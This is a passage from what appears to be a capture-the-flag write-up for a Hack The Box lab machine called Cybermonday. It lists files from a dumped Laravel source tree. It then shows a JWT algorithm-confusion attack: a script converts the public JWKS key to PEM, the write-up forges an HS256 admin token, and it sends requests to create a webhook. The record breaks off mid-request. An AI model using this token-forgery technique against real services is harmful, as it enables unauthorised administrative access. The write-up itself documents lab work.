[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/PreventRequestsDuringMaintenance.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/RedirectIfAuthenticated.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/TrimStrings.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/TrustHosts.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/TrustProxies.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/VerifyCsrfToken.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Models
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Models/Product.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Models/User.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers/AppServiceProvider.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers/AuthServiceProvider.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers/BroadcastServiceProvider.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers/EventServiceProvider.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Providers/RouteServiceProvider.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/artisan
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/bootstrap
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/bootstrap/app.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/bootstrap/cache
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/bootstrap/cache/.gitignore
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/composer.json
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/composer.lock
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/app.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/auth.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/broadcasting.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/cache.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/cors.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/database.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/filesystems.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/hashing.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/logging.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/mail.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/queue.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/sanctum.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/services.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/session.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/config/view.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/factories
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/factories/UserFactory.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations/2014_10_12_000000_create_users_table.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations/2014_10_12_100000_create_password_resets_table.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations/2019_08_19_000000_create_failed_jobs_table.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations/2019_12_14_000001_create_personal_access_tokens_table.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/migrations/2023_01_05_053929_create_products_table.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/seeders
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/seeders/DatabaseSeeder.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/database/seeders/ProductSeeder.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang/en
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang/en/auth.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang/en/pagination.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang/en/passwords.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/lang/en/validation.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/package.json
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/phpunit.xml
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/public
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/public/.htaccess
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/public/favicon.ico
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/public/index.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/public/robots.txt
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/css/app.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/css/github-markdown.min.css
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/img
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/img/cyber-monday.png
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/img/icon.png
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/img/profile.png
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/img/shopping.jpg
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/js/Chart.bundle.min.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/js/app.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/js/bootstrap.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/js/tailwind.js
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/components
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/components/flash.blade.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/dashboard
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/dashboard/changelog.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/dashboard/dashboard.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/dashboard/master.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/dashboard/products.blade.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/home
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/home/home.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/home/profile.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/login.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/master.blade.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/partials
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/partials/header.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/partials/verifyFlash.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/product.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/products.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/register.blade.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/resources/views/welcome.blade.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/routes
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/routes/api.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/routes/channels.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/routes/console.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/routes/web.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/app
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/app/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/app/public
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/app/public/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/cache
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/cache/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/cache/data
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/cache/data/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/sessions
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/sessions/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/testing
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/testing/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/views
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/framework/views/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/logs
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/storage/logs/.gitignore
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/CreatesApplication.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/Feature
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/Feature/ExampleTest.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/TestCase.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/Unit
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/tests/Unit/ExampleTest.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/webpack.mix.js
```

```c
$ cat package.json 
{
    "private": true,
    "scripts": {
        "dev": "npm run development",
        "development": "mix",
        "watch": "mix watch",
        "watch-poll": "mix watch -- --watch-options-poll=1000",
        "hot": "mix watch --hot",
        "prod": "npm run production",
        "production": "mix --production"
    },
    "devDependencies": {
        "axios": "^0.25",
        "laravel-mix": "^6.0.6",
        "lodash": "^4.17.19",
        "postcss": "^8.1.14"
    }
}
```

## Searching for the JASON Web Key Set (JWKS)

> https://medium.com/javarevisited/json-web-key-set-jwks-94dc26847a34

```c
$ curl http://webhooks-api-beta.cybermonday.htb/jwks.json | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   447  100   447    0     0   1253      0 --:--:-- --:--:-- --:--:--  1255
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
      "e": "AQAB"
    }
  ]
}
```

## Algorithm Confusion Attack

> https://portswigger.net/web-security/jwt/algorithm-confusion

```c
$ cat jwks_converter.py 
import base64
import json
from Crypto.PublicKey import RSA

# Your JWK structure
data = '''{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
            "e": "AQAB"
        }
    ]
}'''

jwk = json.loads(data)["keys"][0]
n_b64 = jwk["n"]
e_b64 = jwk["e"]

# Decode base64url values
def b64url_decode(data):
    data += '=' * (4 - (len(data) % 4))
    return base64.urlsafe_b64decode(data)

n = int.from_bytes(b64url_decode(n_b64), byteorder="big")
e = int.from_bytes(b64url_decode(e_b64), byteorder="big")

# Create a public key object using n and e
public_key = RSA.construct((n, e))

# Export as PEM format
pem = public_key.exportKey("PEM")
print(pem.decode())
```

```c
$ python3 jwks_converter.py 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ
fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z
Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7
97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S
xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn
gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1
6wIDAQAB
-----END PUBLIC KEY-----
```

We added the `JWT Editor` from the `Burp Store` and followed the steps in the article from `Port Swigger`.

Base64 encoded PEM:

```c
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
```

Newly generated key:

```c
{
    "kty": "oct",
    "kid": "669bab4b-9b8e-4ade-9eb4-c5a676228d8a",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
}
```

We used the `JWT` from the registration earlier.

```c
{"status":"success","message":{"x-access-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJiYXJmb28iLCJyb2xlIjoidXNlciJ9.psg2aZQGd9RBRYPB06RH4rIWFYd_u9p0Gp5ABBtPCZKJQpiX8bLqXEIDB1LX3SuCo2v3ITzUhbkKSlUt-GPSsOQw48euIrw9dr3xCV3Zm99YNEiectIH0gygvVF0W0gI3S-yAqUqjxEWXG3U1POe7YuueR0PjFvVBkGyDOs_e5hGBqswNKmnBR2JwabVkkLLxlcmr15OBI_2BN78s1U80q7ITiygDv6md2QCe24dItM3YYFRccqpGCo6kp3owORow-NL5eeyS1Usgpj_IR7gXvTF3BveTgZsiOKaP8ITzYuKfk4Xr3CgPTL9dqXzgJ4VLJC0yBQ9Yc4wq8bmYAe5-g"}}
```

According to the article from `Port Swigger` we created two `cookies` in the `JWT Editor Keys` and modified the `request` in the `JSON Web Token` tab.

RSA Key:

```c
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "1",
    "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w"
}
```

New Symmetric Key:

```c
{
    "kty": "oct",
    "kid": "fb222f17-ce94-49cd-8f60-04b598c04d13",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
}
```

Header:

```c
{
    "typ": "JWT",
    "alg": "HS256"
}
```

Payload:

```c
{
    "id": 2,
    "username": "yeeb",
    "role": "admin"
}
```

> Clicked on `Sign`.

| One Token to rule them all |
| --- |
| eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA |

```c
POST /webhooks/create HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=22e7c38d00b81a5645dbbdbd8bef21ef
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Connection: close
Content-Type: application/json
Content-Length: 65

{"name":"foobar", "description":"foobar", "action":"sendRequest"}
```

```c
HTTP/1.1 201 Created
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 08:29:31 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 181

{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"1488ec22-b5e5-4324-aa8d-11df0e2d390c"}
```

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
